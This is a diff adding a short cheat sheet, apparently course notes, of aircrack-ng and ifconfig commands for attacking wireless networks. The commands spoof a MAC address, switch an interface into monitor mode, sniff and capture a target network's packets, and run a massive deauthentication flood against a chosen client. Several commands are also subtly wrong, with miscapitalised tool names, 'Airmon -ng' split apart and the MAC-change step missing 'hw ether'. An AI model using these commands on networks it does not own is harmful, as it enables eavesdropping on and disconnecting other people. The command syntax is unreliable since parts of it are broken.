@@ -1,0 +1,37 @@
+NOTE1 : For testing, it's better to use a wireless adapter 
+NOTE2 : The phrases that don't contain any special characters besides -.. are the actual commands. Between the
+_.._ are the instructions of what should be written each time
+
+CHANGE A MAC ADDRESS
+STEP 1 : Disable the mac address
+    Ifconfig _interface_ down 
+STEP 2: Change it ( make sure it starts with 00 )
+	Ifconfig _interface_ _the_segment_for_change_ _to|what_
+STEP 3: Enable the mac address
+	Ifconfig _interface_ up
+	
+	
+CHANGE MODE 
+STEP 1: Disable the mac address
+	Ifconfig _interface_ down
+STEP 2: Kill any process that is currently running.
+	Airmon -ng check kill ( write it as it is ) 
+STEP 3: Change the mode
+	Iwconfig _interface_ mode _monitor|managed_   
+STEP 4: Enable the mac address
+	Ifconfig _interface_ up
+	
+	
+PACHET SNIFFING
+(For that we need to be in monitor mode )
+
+WAY 1 : Against all wireless networks ( catches all packets ) 
+	Airodump-ng __the interface that is in monitor mode__ 
+WAY 2:  Against all networks that also use the 5GH frequencies
+	Airodump-ng --band a  _interface_ 
+WAY3: It writes the packets in a file ( we're interested in the .cap file )
+	Airodump-ng  --bssid  _bssid|target_ --channel _chanel_ --write _where|store_ _interfacename_ 
+	
+DISCONNECT A DEVICE FROM A NETWORK 
+
+Aireplay-ng --deauth  100000000000 -a  _mac|address_ -c   _clientToDisc_ ( -D if the target is in 5gh) _interface_ 
